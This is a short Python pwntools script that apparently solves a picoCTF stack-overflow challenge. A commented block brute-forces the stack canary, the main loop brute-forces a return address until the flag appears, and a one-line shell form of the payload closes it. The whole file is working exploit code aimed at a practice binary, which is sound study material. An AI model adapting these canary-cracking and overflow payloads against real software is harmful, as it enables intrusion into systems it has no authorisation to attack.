from pwn import *

# Canary Cracking
# canary = ''
# for i in range(1, 5):
#   for e in range(256):
#     sh = process('./vuln')
#     sh.sendlineafter('Please enter the length of the entry:\n> ', str(32+i))
#     sh.sendlineafter('Input> ', 'a'*32+canary+chr(e))
#     output = sh.recvall()
#     if 'Stack Smashing Detected' not in output:
#       print output 
#       canary += chr(e)
#       break
# print canary 

# Python Script (Copied and pasted onto shell server)
def foo():
  address = ''
  for e1 in range(0x00010000,0x01000000,0x10000): #0xFF0000
    for e2 in range(0x1000,0x10000,0x1000): #0xF000
      sh = process('./vuln')
      sh.sendlineafter('Please enter the length of the entry:\n> ', str(100))
      hex_str = 0x56000000+(e1)+(e2)+0x7ed   #1443959277    #1442906605
      #hex_str = 0x56000000+0x110000+0x1100+0xed
      print hex_str
      print format(hex_str, '#10x')
      sh.sendlineafter('Input> ', 'a'*32+"ex;Y"+"a"*16+p32(hex_str))
      output = sh.recvall()
      if 'picoCTF' in output:
        print output
        address = str(e1) + str(e2)
        print address
        return address
print foo()

# Command Form
# { echo "100"; python2 -c 'from pwn import *; print "a"*32+"ex;Y"+"a"*16+p32(0x08049232)';} | ./vuln-my